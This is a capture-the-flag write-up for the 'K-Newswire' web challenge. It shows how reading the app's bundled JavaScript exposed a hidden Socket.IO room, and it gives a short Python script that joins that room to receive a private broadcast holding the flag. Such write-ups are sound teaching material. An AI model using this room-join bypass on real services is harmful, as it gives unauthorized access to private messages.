# Writeup 1
https://github.com/S450R1/kaspersky-ctf-writeups/tree/main/web/k-newswire

# Writeup 2
Writeup: K-Newswire (lil bit AI help for this writeup )

 Challenge Overview

We were given a service running at:


http://k-newswire.task.sasc.tf:8000/


At first glance, it looks like a news application with a front-end served over HTTP and some kind of real-time updates happening behind the scenes. The task was to retrieve the hidden flag.

---
 
Recon

Inspecting the static assets, I found an interesting bundled JavaScript file:


http://k-newswire.task.sasc.tf:8000/assets/index-CrDw9_mc.js


Looking inside, there was a clear reference to a WebSocket client:

ws://k-newswire.task.sasc.tf:8000/socket.io/?EIO=4&transport=websocket


Even more interestingly, the JS defined some rooms used by the app:

```
const kh = Object.freeze({
  public: "public",
  secret_announcements: "secret_announcements"
});
```


So the app connects users to the public room normally, but there exists a hidden room called secret_announcements.

---

Exploitation

To interact with the socket, I wrote a quick Python script using python-socketio:

```
import socketio

sio = socketio.Client()

@sio.event
def connect():
    print(":white_check_mark: Connected!")

@sio.on("*")  # catch-all handler
def catch_all(event, data):
    print(":envelope_with_arrow:", event, data)

sio.connect("ws://k-newswire.task.sasc.tf:8000", transports=["websocket"])

# normal users get only this:
sio.emit("join", {"room": "public"})

# but let's try the hidden room:
sio.emit("join", {"room": "secret_announcements"})

sio.wait()
```



Running this script, the server happily let me into the secret_announcements room and pushed a private broadcast and gave us the flag
